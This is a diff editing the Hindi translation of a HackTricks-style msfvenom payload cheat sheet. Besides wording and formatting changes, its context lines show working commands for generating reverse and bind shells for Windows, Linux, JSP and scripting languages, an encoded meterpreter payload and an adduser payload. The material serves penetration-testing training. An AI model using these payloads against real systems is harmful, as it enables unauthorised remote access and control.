@@ -23,7 +23,7 @@ Join [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) server to 
 हैकिंग की रोमांचक और चुनौतियों में गहराई से जाने वाली सामग्री के साथ जुड़ें
 
 **Real-Time Hack News**\
-तेज-तर्रार हैकिंग दुनिया के साथ वास्तविक समय की खबरों और अंतर्दृष्टियों के माध्यम से अद्यतित रहें
+तेज-तर्रार हैकिंग दुनिया के साथ वास्तविक समय की समाचार और अंतर्दृष्टि के माध्यम से अद्यतित रहें
 
 **Latest Announcements**\
 नवीनतम बग बाउंटी लॉन्च और महत्वपूर्ण प्लेटफ़ॉर्म अपडेट के साथ सूचित रहें
@@ -67,11 +67,7 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
 ```bash
 msfvenom -p windows/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f exe > bind.exe
 ```
-{% endcode %}
-
 ### उपयोगकर्ता बनाएं
-
-{% code overflow="wrap" %}
 ```bash
 msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe
 ```
@@ -98,7 +94,7 @@ msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > enco
 ```
 {% endcode %}
 
-### निष्पादित करने योग्य के अंदर एम्बेडेड
+### निष्पाद्य के अंदर एम्बेडेड
 
 {% code overflow="wrap" %}
 ```bash
@@ -123,6 +119,8 @@ msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf
 ```bash
 msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f elf > bind.elf
 ```
+{% endcode %}
+
 ### SunOS (Solaris)
 
 {% code overflow="wrap" %}
@@ -183,7 +181,7 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f r
 ```
 {% endcode %}
 
-### युद्ध
+### WAR
 
 #### रिवर्स शेल
 
@@ -213,8 +211,6 @@ msfvenom -p cmd/unix/reverse_perl LHOST=(IP Address) LPORT=(Your Port) -f raw > 
 ```bash
 msfvenom -p cmd/unix/reverse_python LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.py
 ```
-{% endcode %}
-
 ### **बैश**
 
 {% code overflow="wrap" %}
@@ -236,7 +232,7 @@ msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f
 **नवीनतम घोषणाएँ**\
 नवीनतम बग बाउंटी लॉन्च और महत्वपूर्ण प्लेटफ़ॉर्म अपडेट के साथ सूचित रहें
 
-**आज ही शीर्ष हैकर्स के साथ सहयोग शुरू करने के लिए** [**Discord**](https://discord.com/invite/N3FrSbmwdy) में शामिल हों!
+**आज ही** [**Discord**](https://discord.com/invite/N3FrSbmwdy) पर हमारे साथ शामिल हों और शीर्ष हैकर्स के साथ सहयोग करना शुरू करें!
 
 {% hint style="success" %}
 AWS हैकिंग सीखें और अभ्यास करें:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
